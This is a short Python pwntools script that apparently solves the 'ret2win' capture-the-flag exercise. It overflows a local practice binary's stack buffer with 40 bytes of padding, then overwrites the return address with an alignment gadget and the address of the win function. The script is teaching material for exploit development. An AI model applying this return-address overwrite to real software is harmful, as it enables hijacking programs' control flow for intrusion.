#!/usr/bin/python3
from pwn import *
gs = '''
    continue
    break main
'''
elf = context.binary = ELF('./ret2win')
context.terminal = ['tmux', 'splitw', '-hp', '70']
def start():
    if args.GDB:
        return gdb.debug('./ret2win', gdbscript=gs)
    else:
        return process('./ret2win')
p = start()
#========= exploit here ===================

offset = 40
re2win = 0x400756
ret =  0x00000000004006e7

payload = [
        b"A"*offset,
        p64(ret),
        p64(re2win)
        ]

p.recvuntil(">")
p.sendline(b"".join(payload))



#========= interactive ====================
p.interactive()
